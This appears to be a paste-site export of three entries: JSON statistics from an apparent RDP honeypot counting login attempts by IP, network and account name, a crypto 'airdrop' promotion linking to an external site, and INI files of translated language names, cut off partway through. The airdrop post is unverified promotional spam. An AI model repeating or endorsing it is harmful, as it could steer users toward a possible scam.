id,title,username,language,date,content
PR5qRvEJ,2024-01-19_stats.json,rdp_snitch,JSON,Friday 19th of January 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""158.220.82.163"": 66,
    ""109.69.7.157"": 5,
    ""216.202.197.116"": 8,
    ""82.32.227.142"": 2,
    ""150.223.62.190"": 1,
    ""208.53.61.115"": 2,
    ""36.111.174.56"": 7,
    ""194.165.17.21"": 35,
    ""110.40.34.231"": 15,
    ""14.18.41.26"": 2,
    ""124.67.115.210"": 6,
    ""125.88.211.59"": 4,
    ""45.141.26.68"": 1,
    ""111.231.15.224"": 1,
    ""104.234.53.134"": 1,
    ""203.56.40.167"": 14,
    ""213.97.250.153"": 13,
    ""45.227.254.8"": 4,
    ""117.33.174.14"": 2,
    ""106.116.169.71"": 2,
    ""140.249.205.213"": 1,
    ""175.120.134.80"": 5,
    ""106.58.164.95"": 2,
    ""115.236.75.10"": 4,
    ""106.58.215.167"": 6,
    ""27.8.44.19"": 21,
    ""103.39.222.217"": 3,
    ""108.181.38.114"": 7,
    ""106.225.199.92"": 3,
    ""219.144.67.36"": 1,
    ""43.134.83.223"": 2,
    ""106.75.245.66"": 2,
    ""203.57.39.224"": 3,
    ""222.93.104.67"": 7,
    ""185.106.176.8"": 1,
    ""103.215.81.133"": 5,
    ""113.108.8.125"": 4,
    ""101.43.49.131"": 3,
    ""150.223.56.176"": 2,
    ""43.243.136.202"": 8,
    ""150.223.66.55"": 4,
    ""111.161.41.132"": 9,
    ""61.171.113.104"": 4,
    ""222.219.240.13"": 7,
    ""80.66.76.92"": 2,
    ""117.145.27.42"": 9,
    ""42.51.13.226"": 2,
    ""203.56.4.242"": 5,
    ""140.246.215.173"": 5,
    ""87.251.75.145"": 4,
    ""101.32.126.66"": 5,
    ""106.58.211.156"": 2,
    ""195.97.20.99"": 2,
    ""106.58.217.61"": 4,
    ""95.130.227.198"": 2,
    ""101.33.204.231"": 1,
    ""103.240.84.186"": 6,
    ""205.210.31.107"": 3,
    ""81.69.247.8"": 1,
    ""203.57.46.218"": 3,
    ""175.4.26.179"": 5,
    ""106.58.210.135"": 2,
    ""124.67.254.109"": 13,
    ""122.227.146.74"": 3,
    ""103.184.47.83"": 2,
    ""115.159.51.34"": 1,
    ""52.80.19.192"": 4,
    ""182.61.55.68"": 1,
    ""106.58.164.84"": 3,
    ""113.200.222.57"": 6,
    ""61.171.106.140"": 2,
    ""150.223.35.239"": 2,
    ""62.204.41.195"": 6,
    ""150.223.76.57"": 3,
    ""87.251.75.64"": 1,
    ""175.178.78.184"": 1,
    ""106.55.54.44"": 3,
    ""1.82.238.130"": 3,
    ""185.170.144.113"": 1,
    ""211.91.60.69"": 3,
    ""185.170.144.3"": 2,
    ""45.93.20.204"": 3,
    ""103.245.195.202"": 7,
    ""180.76.153.250"": 1,
    ""106.58.212.195"": 4,
    ""36.111.146.78"": 3,
    ""43.133.56.30"": 1,
    ""125.230.237.214"": 3,
    ""159.75.129.201"": 2,
    ""43.134.0.225"": 2,
    ""147.135.91.23"": 6,
    ""175.120.134.93"": 3,
    ""111.229.232.159"": 1,
    ""43.128.12.208"": 28,
    ""150.223.32.106"": 1,
    ""205.210.31.217"": 3,
    ""43.139.115.6"": 1,
    ""194.165.16.76"": 2,
    ""106.58.217.149"": 3,
    ""222.219.129.74"": 1,
    ""128.1.38.231"": 1,
    ""106.245.242.218"": 2,
    ""172.81.216.105"": 2,
    ""95.136.11.137"": 1,
    ""103.130.212.203"": 1,
    ""202.134.162.131"": 1,
    ""106.58.166.180"": 1,
    ""185.13.39.65"": 2,
    ""45.84.198.42"": 1,
    ""191.223.28.34"": 1,
    ""54.37.51.226"": 1,
    ""106.225.199.24"": 3,
    ""87.251.75.120"": 2,
    ""1.117.40.238"": 1,
    ""81.70.142.203"": 1,
    ""58.247.112.34"": 1,
    ""150.223.20.90"": 1,
    ""106.12.113.55"": 2,
    ""106.58.165.88"": 1,
    ""45.141.26.223"": 2,
    ""103.47.194.216"": 1,
    ""119.91.205.99"": 2,
    ""106.58.178.2"": 3,
    ""118.195.233.102"": 2,
    ""36.91.222.100"": 1,
    ""120.202.49.41"": 2,
    ""101.32.116.25"": 4,
    ""106.58.221.13"": 5,
    ""45.141.26.152"": 1,
    ""123.56.20.194"": 1,
    ""113.31.157.54"": 1,
    ""81.19.135.2"": 3,
    ""58.218.204.183"": 3,
    ""42.51.39.209"": 1,
    ""220.121.130.124"": 1,
    ""209.126.0.181"": 1,
    ""42.193.192.91"": 2,
    ""152.32.207.21"": 1,
    ""51.81.77.246"": 2,
    ""201.18.18.173"": 1,
    ""43.153.99.114"": 1,
    ""183.134.89.41"": 3,
    ""106.75.254.159"": 2,
    ""150.223.13.195"": 1,
    ""106.58.219.212"": 1,
    ""205.210.31.237"": 3,
    ""94.232.45.101"": 2,
    ""118.193.44.118"": 2,
    ""103.44.237.12"": 1,
    ""185.161.248.219"": 1,
    ""45.141.26.228"": 1,
    ""79.129.23.188"": 1,
    ""165.154.33.72"": 1,
    ""45.227.254.55"": 2,
    ""201.80.184.90"": 1,
    ""106.58.184.58"": 4,
    ""167.94.145.57"": 1,
    ""106.58.212.201"": 1,
    ""179.60.147.99"": 1,
    ""123.206.124.122"": 1,
    ""45.227.254.48"": 2,
    ""179.60.150.59"": 1,
    ""150.223.46.21"": 1,
    ""198.235.24.95"": 3,
    ""106.75.123.252"": 2,
    ""27.128.239.46"": 1,
    ""142.4.218.114"": 1,
    ""213.32.39.43"": 1,
    ""218.90.120.19"": 1
  },
  ""asn"": {
    ""AS51167"": 66,
    ""AS21183"": 5,
    ""AS3356"": 8,
    ""AS5089"": 2,
    ""AS58519"": 56,
    ""AS17341"": 2,
    ""AS48721"": 37,
    ""AS38283"": 15,
    ""AS4134"": 77,
    ""AS4837"": 64,
    ""AS58466"": 4,
    ""AS142299"": 5,
    ""AS45090"": 26,
    ""AS206092"": 1,
    ""AS3352"": 13,
    ""AS267784"": 8,
    ""AS134768"": 6,
    ""AS58541"": 1,
    ""AS9318"": 8,
    ""AS4816"": 4,
    ""AS40676"": 7,
    ""AS134238"": 6,
    ""AS132203"": 43,
    ""AS17621"": 6,
    ""AS42960"": 1,
    ""AS55933"": 5,
    ""AS4808"": 8,
    ""AS4812"": 6,
    ""AS208091"": 9,
    ""AS9808"": 11,
    ""AS56005"": 3,
    ""AS3329"": 2,
    ""AS35682"": 2,
    ""AS396982"": 12,
    ""AS63838"": 5,
    ""AS146817"": 2,
    ""AS55960"": 4,
    ""AS38365"": 4,
    ""AS59425"": 6,
    ""AS197414"": 3,
    ""AS57523"": 3,
    ""AS9541"": 7,
    ""AS3462"": 3,
    ""AS16276"": 11,
    ""AS135377"": 5,
    ""AS3786"": 2,
    ""AS12353"": 1,
    ""AS135953"": 1,
    ""AS132296"": 1,
    ""AS197922"": 2,
    ""AS49581"": 1,
    ""AS8167"": 1,
    ""AS140832"": 1,
    ""AS7713"": 1,
    ""AS37963"": 1,
    ""AS209588"": 4,
    ""AS4766"": 1,
    ""AS40021"": 1,
    ""AS7738"": 1,
    ""AS58461"": 3,
    ""AS212482"": 2,
    ""AS49202"": 1,
    ""AS6799"": 1,
    ""AS28573"": 1,
    ""AS398705"": 1,
    ""AS211179"": 1,
    ""AS23724"": 2
  },
  ""isp"": {
    ""Contabo GmbH"": 66,
    ""Vodafone Network"": 5,
    ""Level 3 Communications"": 8,
    ""Virgin Media"": 2,
    ""Cloud Computing Corporation"": 56,
    ""C7 Data Centers"": 2,
    ""Flyservers S.A."": 49,
    ""CHINANET SiChuan Telecom Internet Data Center"": 15,
    ""CHINANET Guangdong province network"": 2,
    ""CNC Group CHINA169 Neimeng Province Network"": 19,
    ""China Telecom"": 4,
    ""CLOUDFOREST CO., LTD"": 5,
    ""Shenzhen Tencent Computer Systems Company Limited"": 25,
    ""Velcom"": 1,
    ""Telefonica de Espana SAU"": 13,
    ""CHINANET SHAANXI province Cloud Base network"": 6,
    ""Chinanet"": 78,
    ""Qingdao, "": 1,
    ""SK Broadband Co Ltd"": 8,
    ""China Unicom Chongqing Province Network"": 21,
    ""China Telecom (Group)"": 10,
    ""Psychz Networks"": 7,
    ""CHINANET Jiangx province IDC network"": 6,
    ""UCLOUD"": 7,
    ""VH-GLOBAL"": 1,
    ""Cloudie Limited"": 5,
    ""China Unicom Beijing Province Network"": 8,
    ""China Unicom Tianjin Province Network"": 9,
    ""Xhost Internet Solutions LP"": 14,
    ""China Mobile communications corporation"": 11,
    ""China Unicom Henan Province network"": 3,
    ""Aceville Pte.ltd"": 38,
    ""HOL"": 2,
    ""Best Internet Solution XK"": 2,
    ""China Unicom CHINA169 Network"": 6,
    ""Google LLC"": 12,
    ""Hengyang"": 5,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Beijing Guanghuan Xinwang Digital"": 4,
    ""Beijing Baidu Netcom Science and Technology Co., Ltd."": 4,
    ""CNC Group CHINA169 Shannxi Province Network"": 6,
    ""Horizon LLC"": 6,
    ""CHINA UNICOM China169 Backbone"": 3,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Cyber Internet Services (Private) Limited"": 7,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""OVH SAS"": 11,
    ""Zenlayer Inc"": 1,
    ""LG DACOM Corporation"": 2,
    ""Vodafone Portugal"": 1,
    ""P815"": 1,
    ""Seven Star Digital Network Private Limited"": 1,
    ""Techcrea Solutions SAS"": 2,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""V tal"": 2,
    ""China Internet Network Information Center"": 5,
    ""EuroNet Internet"": 1,
    ""CNC Group CHINA169 Shanghai Province Network"": 1,
    ""FTECH"": 1,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Korea Telecom"": 1,
    ""Nubes, LLC"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Kisara LLC"": 1,
    ""OTEnet"": 1,
    ""Claro NXT Telecomunicacoes Ltda"": 1,
    ""Censys, Inc."": 1,
    ""Veraton Projects LTD"": 1
  },
  ""org"": {
    ""Contabo GmbH"": 66,
    ""Unknown"": 116,
    ""Fort Wayne Internet, LLC"": 8,
    ""Chinanet SD"": 22,
    ""VegaDigital Solutions"": 2,
    ""Chinanet ZJ"": 10,
    ""Flyservers S.A"": 37,
    ""Chengdu Giant Times Technology Co., Ltd"": 15,
    ""Chinanet GD"": 6,
    ""Cloudforest CO., LTD"": 5,
    ""Tencent cloud computing (Beijing) Co., Ltd."": 12,
    ""ONTAR-40 (Velcom INC)"": 1,
    ""Chinanet FJ"": 25,
    ""RIMA (Red IP Multi Acceso)"": 13,
    ""UAB Host Baltic"": 8,
    ""Chinanet SN"": 6,
    ""Chinanet HE"": 3,
    ""SK Broadband Co Ltd"": 8,
    ""Chinanet YN"": 50,
    ""Hangzhou xiaoshan public transportation co., LTD"": 4,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 4,
    ""TELUS Communications Inc."": 7,
    ""Chinanet JX"": 6,
    ""Tencent Cloud Computing"": 5,
    ""Shanghai UCloud Information Technology Company Limited"": 7,
    ""Chinanet JS"": 11,
    ""VH Global Limited"": 1,
    ""Netads Online Limited"": 5,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 12,
    ""Beijing yunchuang communication Technology Co."": 8,
    ""Chinanet SH"": 6,
    ""Xhost Internet Solutions"": 9,
    ""China Mobile"": 11,
    ""Henan Telcom Union Technology Co., LTD"": 3,
    ""Koumakis Emm. S.A."": 2,
    ""Best Internet Solution XK"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Chinanet HN"": 5,
    ""Ningbo chaoji mamawangluojishu ltd"": 3,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""AWS EC2 (cn-north-1)"": 4,
    ""Beijing Baidu Netcom Science and Technology Co., Ltd."": 4,
    ""Horizon LLC"": 6,
    ""Golden-Bridge Netcom communication Co., LTD."": 1,
    ""Xhostis"": 3,
    ""Unicom"": 3,
    ""Starcrecium Limited"": 3,
    ""Cyber Internet Services Pakistan"": 7,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""OVH US LLC"": 8,
    ""UCLOUD"": 1,
    ""Boranet"": 2,
    ""Vodafone Portugal - Communicacoes Pessoais S.A."": 1,
    ""7 STAR Dot Com Pvt. Ltd"": 1,
    ""Firstheberg"": 2,
    ""Flaxhosting"": 1,
    ""Brasil Telecom S/A - Filial Distrito Federal"": 1,
    ""chen zexin"": 1,
    ""Online Breedband B.V."": 1,
    ""Telekomunikasi Indonesia"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""Alviva Holding Limited"": 3,
    ""Kornet"": 1,
    ""Contabo Inc"": 1,
    ""Ucloud Information Technology"": 1,
    ""V tal"": 1,
    ""Dmitriy Panchenko"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Kisara LLC"": 1,
    ""OTEnet S.A."": 1,
    ""NET Servi\u00e7os de Comunica\u00e7\u00e3o S.A."": 1,
    ""Censys, Inc."": 1,
    ""Cloud Solutions S.A"": 1,
    ""Maxwell Group LTD"": 1,
    ""OVH Hosting, Inc."": 1,
    ""ONYPHE"": 1
  },
  ""regionName"": {
    ""England"": 66,
    ""Tirana"": 5,
    ""Indiana"": 8,
    ""Scotland"": 2,
    ""Shandong"": 22,
    ""Utah"": 2,
    ""Zhejiang"": 20,
    ""Kaunas"": 37,
    ""Sichuan"": 15,
    ""Guangdong"": 32,
    ""Fujian"": 31,
    ""Bangkok"": 5,
    ""Shanghai"": 15,
    ""New York"": 1,
    ""Madrid"": 13,
    ""Vilnius"": 8,
    ""Shanxi"": 3,
    ""Hebei"": 3,
    ""Gyeongsangbuk-do"": 8,
    ""Yunnan"": 50,
    ""Chongqing"": 21,
    ""California"": 20,
    ""Jiangxi"": 6,
    ""North West"": 6,
    ""Beijing"": 44,
    ""Jiangsu"": 11,
    ""Central and Western District"": 36,
    ""Tianjin"": 9,
    ""North Holland"": 12,
    ""Henan"": 3,
    ""Central Singapore"": 9,
    ""Attica"": 2,
    ""Tashkent"": 2,
    ""Hunan"": 5,
    ""Inner Mongolia"": 13,
    ""Hubei"": 2,
    ""Shaanxi"": 9,
    ""Moscow"": 10,
    ""Sindh"": 7,
    ""Taichung City"": 3,
    ""Virginia"": 9,
    ""Incheon"": 2,
    ""Lisbon"": 1,
    ""Hanoi"": 1,
    ""Maharashtra"": 1,
    ""Hauts-de-France"": 4,
    ""Capital Region"": 1,
    ""Mato Grosso do Sul"": 1,
    ""Thanh H\u00f3a Province"": 1,
    ""Jakarta"": 1,
    ""Hesse"": 4,
    ""Gyeonggi-do"": 1,
    ""Missouri"": 1,
    ""Rio de Janeiro"": 1,
    ""Perm Krai"": 2,
    ""Thessaly"": 1,
    ""Metro Manila"": 1,
    ""Minas Gerais"": 1,
    ""Distrito Federal"": 2,
    ""Quebec"": 1
  },
  ""country"": {
    ""United Kingdom"": 68,
    ""Albania"": 5,
    ""United States"": 41,
    ""China"": 314,
    ""Lithuania"": 45,
    ""Thailand"": 5,
    ""Spain"": 13,
    ""South Korea"": 11,
    ""Singapore"": 15,
    ""Hong Kong"": 36,
    ""The Netherlands"": 12,
    ""Greece"": 3,
    ""Uzbekistan"": 2,
    ""Russia"": 12,
    ""Pakistan"": 7,
    ""Taiwan"": 3,
    ""Portugal"": 1,
    ""Vietnam"": 2,
    ""India"": 1,
    ""France"": 4,
    ""Denmark"": 1,
    ""Brazil"": 3,
    ""Indonesia"": 1,
    ""Germany"": 4,
    ""Philippines"": 1,
    ""Venezuela"": 2,
    ""Canada"": 1
  },
  ""account"": {
    ""hello"": 73,
    ""142.93.8.59"": 445,
    ""(empty)"": 7,
    ""Test"": 19,
    ""Administr"": 14,
    ""UsanARGqC"": 1,
    ""riDtIi"": 1,
    ""AHmQRt"": 1,
    ""Domain"": 10,
    ""Administrator"": 32,
    ""XUekHxYWk"": 1,
    ""CcdqTu"": 1,
    ""iULJZM"": 1,
    ""sdXkwoFWs"": 1,
    ""ddQPbg"": 1,
    ""fjhSgQ"": 1,
    ""user"": 1,
    ""cpraXgdxh"": 1,
    ""HDFowS"": 1,
    ""GFUWgH"": 1
  },
  ""keyboard"": {
    ""Unknown"": 613
  },
  ""client_build"": {
    ""Unknown"": 613
  },
  ""client_name"": {
    ""Unknown"": 613
  },
  ""ip_type"": {
    ""hosting"": 216,
    ""Unknown"": 369,
    ""proxy"": 15,
    ""mobile"": 13
  }
}"
jwkNLkjW,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Friday 19th of January 2024 05:44:35 PM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

807949"
x0Pxr5gW,"names of languages, translations",PonPonTheBonBon,INI file,Friday 19th of January 2024 05:42:20 PM CDT,"Catalan.ini
LANG_BAR=bavarès
LANG_CA=català
LANG_CS=txec
LANG_DA=danès
LANG_DE=alemany
LANG_DE_AT=austríac
LANG_EL=grec
LANG_EN=anglès
LANG_ES=espanyol
LANG_ES_PE=peruà
LANG_EU=basc
LANG_FI=finès
LANG_FR=francès
LANG_GD=gaèlic escocès
LANG_GL=gallec
LANG_HR=croat
LANG_HU=hongarès
LANG_IS=islandès
LANG_IT=italià
LANG_JA=japonès
LANG_KSH=kölsch
LANG_LB=luxemburguès
LANG_NL=neerlandès
LANG_NO=noruec
LANG_PL=polonès
LANG_PT=portuguès
LANG_RO=romanès
LANG_RU=rus
LANG_SK=eslovac
LANG_SL=eslovè
LANG_SR=serbi
LANG_SV=suec
LANG_TR=turc
LANG_ZH=xinès

Chinese.ini
LANG_BAR=巴伐利亚语
LANG_CA=加泰罗尼亚语
LANG_CS=捷克语
LANG_DA=丹麦语
LANG_DE=德语
LANG_DE_AT=奥地利语
LANG_EL=希腊语
LANG_EN=英语
LANG_ES=西班牙语
LANG_ES_PE=秘鲁语
LANG_EU=巴斯克语
LANG_FI=芬兰语
LANG_FR=法语
LANG_GD=苏格兰盖尔语
LANG_GL=加利西亚语
LANG_HR=克罗地亚语
LANG_HU=匈牙利语
LANG_IS=冰岛语
LANG_IT=意大利语
LANG_JA=日语
LANG_KSH=科隆语
LANG_LB=卢森堡语
LANG_NL=荷兰语
LANG_NO=挪威语
LANG_PL=波兰语
LANG_PT=葡萄牙语
LANG_RO=罗马尼亚语
LANG_RU=俄语
LANG_SK=斯洛伐克语
LANG_SL=斯洛文尼亚语
LANG_SR=塞尔维亚语
LANG_SV=瑞典语
LANG_TR=土耳其语
LANG_ZH=中文

Croatian.ini
LANG_BAR=bavarski
LANG_CA=katalonski
LANG_CS=češki
LANG_DA=danski
LANG_DE=njemački
LANG_DE_AT=austrijski
LANG_EL=grčki
LANG_EN=engleski
LANG_ES=španjolski
LANG_ES_PE=peruanski
LANG_EU=baskijski
LANG_FI=finski
LANG_FR=francuski
LANG_GD=škotski gaelski
LANG_GL=galicijski
LANG_HR=hrvatski
LANG_HU=mađarski
LANG_IS=islandski
LANG_IT=talijanski
LANG_JA=japanski
LANG_KSH=kelnski
LANG_LB=luksemburški
LANG_NL=nizozemski
LANG_NO=norveški
LANG_PL=poljski
LANG_PT=portugalski
LANG_RO=rumunjski
LANG_RU=ruski
LANG_SK=slovački
LANG_SL=slovenski
LANG_SR=srpski
LANG_SV=švedski
LANG_TR=turski
LANG_ZH=kineski

Czech.ini
LANG_BAR=bavorština
LANG_CA=katalánština
LANG_CS=čeština
LANG_DA=dánština
LANG_DE=němčina
LANG_DE_AT=rakouština
LANG_EL=řečtina
LANG_EN=angličtina
LANG_ES=španělština
LANG_ES_PE=peruánština
LANG_EU=baskičtina
LANG_FI=finština
LANG_FR=francouzština
LANG_GD=skotská gaelština
LANG_GL=galicijština
LANG_HR=chorvatština
LANG_HU=maďarština
LANG_IS=islandština
LANG_IT=italština
LANG_JA=japonština
LANG_KSH=kolínština
LANG_LB=lucemburština
LANG_NL=nizozemština
LANG_NO=norština
LANG_PL=polština
LANG_PT=portugalština
LANG_RO=rumunština
LANG_RU=ruština
LANG_SK=slovenština
LANG_SL=slovinština
LANG_SR=srbština
LANG_SV=švédština
LANG_TR=turečtina
LANG_ZH=čínština

Danish.ini
LANG_BAR=bayersk
LANG_CA=catalansk
LANG_CS=tjekkisk
LANG_DA=dansk
LANG_DE=tysk
LANG_DE_AT=østrigsk
LANG_EL=græsk
LANG_EN=engelsk
LANG_ES=spansk
LANG_ES_PE=peruansk
LANG_EU=baskisk
LANG_FI=finsk
LANG_FR=fransk
LANG_GD=skotsk gælisk
LANG_GL=galicisk
LANG_HR=kroatisk
LANG_HU=ungarsk
LANG_IS=islandsk
LANG_IT=italiensk
LANG_JA=japansk
LANG_KSH=kölsch
LANG_LB=luxembourgsk
LANG_NL=nederlandsk
LANG_NO=norsk
LANG_PL=polsk
LANG_PT=portugisisk
LANG_RO=rumænsk
LANG_RU=russisk
LANG_SK=slovakisk
LANG_SL=slovensk
LANG_SR=serbisk
LANG_SV=svensk
LANG_TR=tyrkisk
LANG_ZH=kinesisk

Dutch.ini
LANG_BAR=Beiers
LANG_CA=Catalaans
LANG_CS=Tsjechisch
LANG_DA=Deens
LANG_DE=Duits
LANG_DE_AT=Oostenrijks
LANG_EL=Grieks
LANG_EN=Engels
LANG_ES=Spaans
LANG_ES_PE=Peruaans
LANG_EU=Baskisch
LANG_FI=Fins
LANG_FR=Frans
LANG_GD=Schots-Gaelisch
LANG_GL=Galicisch
LANG_HR=Kroatisch
LANG_HU=Hongaars
LANG_IS=IJslands
LANG_IT=Italiaans
LANG_JA=Japans
LANG_KSH=Kölsch
LANG_LB=Luxemburgs
LANG_NL=Nederlands
LANG_NO=Noors
LANG_PL=Pools
LANG_PT=Portugees
LANG_RO=Roemeens
LANG_RU=Russisch
LANG_SK=Slowaaks
LANG_SL=Sloveens
LANG_SR=Servisch
LANG_SV=Zweeds
LANG_TR=Turks
LANG_ZH=Chinees

English.ini
LANG_BAR=Bavarian
LANG_CA=Catalan
LANG_CS=Czech
LANG_DA=Danish
LANG_DE=German
LANG_DE_AT=Austrian
LANG_EL=Greek
LANG_EN=English
LANG_ES=Spanish
LANG_ES_PE=Peruvian
LANG_EU=Basque
LANG_FI=Finnish
LANG_FR=French
LANG_GD=Scottish Gaelic
LANG_GL=Galician
LANG_HR=Croatian
LANG_HU=Hungarian
LANG_IS=Icelandic
LANG_IT=Italian
LANG_JA=Japanese
LANG_KSH=Colognian
LANG_LB=Luxembourgish
LANG_NL=Dutch
LANG_NO=Norwegian
LANG_PL=Polish
LANG_PT=Portuguese
LANG_RO=Romanian
LANG_RU=Russian
LANG_SK=Slovak
LANG_SL=Slovenian
LANG_SR=Serbian
LANG_SV=Swedish
LANG_TR=Turkish
LANG_ZH=Chinese

Euskara.ini
LANG_BAR=bavariera
LANG_CA=katalana
LANG_CS=txekiera
LANG_DA=daniera
LANG_DE=alemana
LANG_DE_AT=austriara
LANG_EL=greziera
LANG_EN=ingelesa
LANG_ES=gaztelania
LANG_ES_PE=perutara
LANG_EU=euskara
LANG_FI=finlandiera
LANG_FR=frantsesa
LANG_GD=Eskoziako gaelikoa
LANG_GL=galiziera
LANG_HR=kroaziera
LANG_HU=hungariera
LANG_IS=islandiera
LANG_IT=italiera
LANG_JA=japoniera
LANG_KSH=koloniera
LANG_LB=luxenburgera
LANG_NL=nederlandera
LANG_NO=norvegiera
LANG_PL=poloniera
LANG_PT=portugesa
LANG_RO=errumaniera
LANG_RU=errusiera
LANG_SK=eslovakiera
LANG_SL=esloveniera
LANG_SR=serbiera
LANG_SV=suediera
LANG_TR=turkiera
LANG_ZH=txinera

Finnish.ini
LANG_BAR=baijeri
LANG_CA=katalaani
LANG_CS=tšekki
LANG_DA=tanska
LANG_DE=saksa
LANG_DE_AT=itävallan
LANG_EL=kreikka
LANG_EN=englanti
LANG_ES=espanja
LANG_ES_PE=perun
LANG_EU=baski
LANG_FI=suomi
LANG_FR=ranska
LANG_GD=gaeli
LANG_GL=galicia
LANG_HR=kroatia
LANG_HU=unkari
LANG_IS=islanti
LANG_IT=italia
LANG_JA=japani
LANG_KSH=kölsch
LANG_LB=luxemburg
LANG_NL=hollanti
LANG_NO=norja
LANG_PL=puola
LANG_PT=portugali
LANG_RO=romania
LANG_RU=venäjä
LANG_SK=slovakki
LANG_SL=sloveeni
LANG_SR=serbia
LANG_SV=ruotsi
LANG_TR=turkki
LANG_ZH=kiina

French.ini
LANG_BAR=bavarois
LANG_CA=catalan
LANG_CS=tchèque
LANG_DA=danois
LANG_DE=allemand
LANG_DE_AT=autrichien
LANG_EL=grec
LANG_EN=anglais
LANG_ES=espagnol
LANG_ES_PE=péruvien
LANG_EU=basque
LANG_FI=finnois
LANG_FR=français
LANG_GD=gaélique écossais
LANG_GL=galicien
LANG_HR=croate
LANG_HU=hongrois
LANG_IS=islandais
LANG_IT=italien
LANG_JA=japonais
LANG_KSH=kölsch
LANG_LB=luxembourgeois
LANG_NL=néerlandais
LANG_NO=norvégien
LANG_PL=polonais
LANG_PT=portugais
LANG_RO=roumain
LANG_RU=russe
LANG_SK=slovaque
LANG_SL=slovène
LANG_SR=serbe
LANG_SV=suédois
LANG_TR=turc
LANG_ZH=chinois

Gaelic.ini
LANG_BAR=Bhabhàiria
LANG_CA=Catalanais
LANG_CS=Seicis
LANG_DA=Danmhairgis
LANG_DE=Gearmailtis
LANG_DE_AT=Ostaireais
LANG_EL=Greugais
LANG_EN=Beurla
LANG_ES=Spàinntis
LANG_ES_PE=Pearùthais
LANG_EU=Basgais
LANG_FI=Fionnlannais
LANG_FR=Fraingis
LANG_GD=Gàidhlig
LANG_GL=Gailìsis
LANG_HR=Cròthaisis
LANG_HU=Ungairis
LANG_IS=Innis Tìlis
LANG_IT=Eadailtis
LANG_JA=Seapanais
LANG_KSH=Gearmailtis Chologne
LANG_LB=Lugsamburgais
LANG_NL=Duitsis
LANG_NO=Nirribhis
LANG_PL=Pòlainnis
LANG_PT=Portagailis
LANG_RO=Romàinis
LANG_RU=Ruisis
LANG_SK=Slòbhacais
LANG_SL=Slòbhainis
LANG_SR=Sèirbis
LANG_SV=Suainis
LANG_TR=Turcais
LANG_ZH=Sìnis

Galician.ini
LANG_BAR=bavarés
LANG_CA=catalán
LANG_CS=checo
LANG_DA=dinamarqués
LANG_DE=alemán
LANG_DE_AT=austríaco
LANG_EL=grego
LANG_EN=inglés
LANG_ES=español
LANG_ES_PE=peruano
LANG_EU=éuscaro
LANG_FI=finés
LANG_FR=francés
LANG_GD=gaélico escocés
LANG_GL=galego
LANG_HR=croata
LANG_HU=húngaro
LANG_IS=islandés
LANG_IT=italiano
LANG_JA=xaponés
LANG_KSH=kölsch
LANG_LB=luxemburgués
LANG_NL=neerlandés
LANG_NO=noruegués
LANG_PL=polaco
LANG_PT=portugués
LANG_RO=romanés
LANG_RU=ruso
LANG_SK=eslovaco
LANG_SL=esloveno
LANG_SR=serbio
LANG_SV=sueco
LANG_TR=turco
LANG_ZH=chinés

German.ini
LANG_BAR=Bairisch
LANG_CA=Katalanisch
LANG_CS=Tschechisch
LANG_DA=Dänisch
LANG_DE=Deutsch
LANG_DE_AT=Österreichisch
LANG_EL=Griechisch
LANG_EN=Englisch
LANG_ES=Spanisch
LANG_ES_PE=Peruanisch
LANG_EU=Baskisch
LANG_FI=Finnisch
LANG_FR=Französisch
LANG_GD=Gälisch (Schottland)
LANG_GL=Galicisch
LANG_HR=Kroatisch
LANG_HU=Ungarisch
LANG_IS=Isländisch
LANG_IT=Italienisch
LANG_JA=Japanisch
LANG_KSH=Kölsch
LANG_LB=Luxemburgisch
LANG_NL=Niederländisch
LANG_NO=Norwegisch
LANG_PL=Polnisch
LANG_PT=Portugiesisch
LANG_RO=Rumänisch
LANG_RU=Russisch
LANG_SK=Slowakisch
LANG_SL=Slowenisch
LANG_SR=Serbisch
LANG_SV=Schwedisch
LANG_TR=Türkisch
LANG_ZH=Chinesisch

Greek.ini
LANG_BAR=Βαυαρικά
LANG_CA=Καταλανικά
LANG_CS=Τσεχικά
LANG_DA=Δανικά
LANG_DE=Γερμανικά
LANG_DE_AT=Αυστριακά
LANG_EL=Ελληνικά
LANG_EN=Αγγλικά
LANG_ES=Ισπανικά
LANG_ES_PE=Περουβιάνά
LANG_EU=Βασκικά
LANG_FI=Φινλανδικά
LANG_FR=Γαλλικά
LANG_GD=Σκωτικά Κελτικά
LANG_GL=Γαλικιανά
LANG_HR=Κροατικά
LANG_HU=Ουγγρικά
LANG_IS=Ισλανδικά
LANG_IT=Ιταλικά
LANG_JA=Ιαπωνικά
LANG_KSH=Κολωνικά
LANG_LB=Λουξεμβουργιανά
LANG_NL=Ολλανδικά
LANG_NO=Νορβηγικά
LANG_PL=Πολωνικά
LANG_PT=Πορτογαλικά
LANG_RO=Ρουμανικά
LANG_RU=Ρωσικά
LANG_SK=Σλοβακικά
LANG_SL=Σλοβενικά
LANG_SR=Σερβικά
LANG_SV=Σουηδικά
LANG_TR=Τουρκικά
LANG_ZH=Κινεζικά

Hungarian.ini
LANG_BAR=bajor
LANG_CA=katalán
LANG_CS=cseh
LANG_DA=dán
LANG_DE=német
LANG_DE_AT=osztrák
LANG_EL=görög
LANG_EN=angol
LANG_ES=spanyol
LANG_ES_PE=perui
LANG_EU=baszk
LANG_FI=finn
LANG_FR=francia
LANG_GD=skóciai kelta
LANG_GL=gallego
LANG_HR=horvát
LANG_HU=magyar
LANG_IS=izlandi
LANG_IT=olasz
LANG_JA=japán
LANG_KSH=kölsch
